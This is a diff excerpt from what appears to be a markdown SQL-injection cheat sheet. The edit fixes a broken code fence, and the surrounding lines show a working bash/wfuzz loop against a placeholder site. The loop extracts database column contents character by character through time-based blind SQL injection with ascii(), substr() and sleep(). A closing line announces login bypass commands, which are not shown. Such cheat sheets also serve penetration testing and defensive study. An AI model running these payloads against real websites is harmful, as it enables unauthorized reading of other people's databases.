@@ -138,9 +138,9 @@ for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?i
 Extract column content with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
 ```php
 for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "http://meh.com/index.php?id=1' and if(ascii(substr((select <column name> from <table name> limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # change <column name> to get the content of next column
-``
+```
 Time-based error SQL command injection with bash magic demo
-`
+
 ![alt text](https://j.gifs.com/2vv2J1.gif)
 
 Hope those were helpfull! Now here's couple login bypass commands that worked for me
